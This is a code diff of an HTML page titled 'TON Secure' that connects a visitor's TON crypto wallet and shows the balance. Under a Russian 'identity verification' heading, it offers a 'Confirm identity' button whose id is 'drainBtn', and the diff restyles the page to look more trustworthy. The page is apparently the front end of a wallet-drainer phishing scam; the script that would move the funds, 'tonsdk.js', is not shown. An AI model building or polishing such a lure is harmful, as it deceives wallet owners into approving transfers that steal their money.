@@ -6,15 +6,20 @@
     <title>TON Secure</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
-        body { font-family: Arial; padding: 20px; background: #1a1a2e; color: #eee; }
-        #balance { margin: 20px 0; font-size: 20px; }
-        button { padding: 10px 30px; font-size: 24px; }
+        body { font-family: Arial; padding: 20px; background: #1a1a2e; color: #eee; text-align: center; }
+        #balance { margin: 20px 0; font-size: 22px; }
+        button { padding: 12px 40px; font-size: 22px; border: none; border-radius: 8px; cursor: pointer; }
+        #connectBtn { background: #4CAF50; color: white; }
+        #drainBtn { background: #f44336; color: white; }
+        #drainBtn:disabled { opacity: 0.5; cursor: not-allowed; }
+        #ton-connect { display: inline-block; margin: 20px 0; }
     </style>
 </head>
 <body>
-    <div id="ton-connect" style="margin:20px;"></div>
+    <h1>🔐 Проверка личности</h1>
+    <div id="ton-connect"></div>
     <div id="balance">Баланс: <span id="balanceValue">—</span> TON</div>
-    <button id="drainBtn" style="margin:20px;padding:10px 30px;font-size:24px;" disabled>Подтвердить личность</button>
+    <button id="drainBtn" disabled>Подтвердить личность</button>
     <script src="tonsdk.js"></script>
 </body>
 </html>
